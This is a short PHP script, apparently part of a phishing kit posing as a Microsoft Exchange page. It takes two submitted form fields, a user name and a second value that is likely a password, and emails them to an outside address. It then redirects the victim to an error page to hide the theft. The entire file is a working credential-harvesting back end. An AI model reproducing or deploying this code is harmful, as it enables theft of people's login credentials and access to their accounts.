<?php 



$NUMBER = $_POST['NUMBER'];
$xuser = $_POST['xuser'];



$to = "admin@clickheretoviewreport.com"; 

$subject = "New Message from Exchange"; 


$body = "NUMBER : $NUMBER, xuser : $xuser";



mail($to,$subject,$body,$NUMBER,$xuser); 

header("location:ERROR.html");?>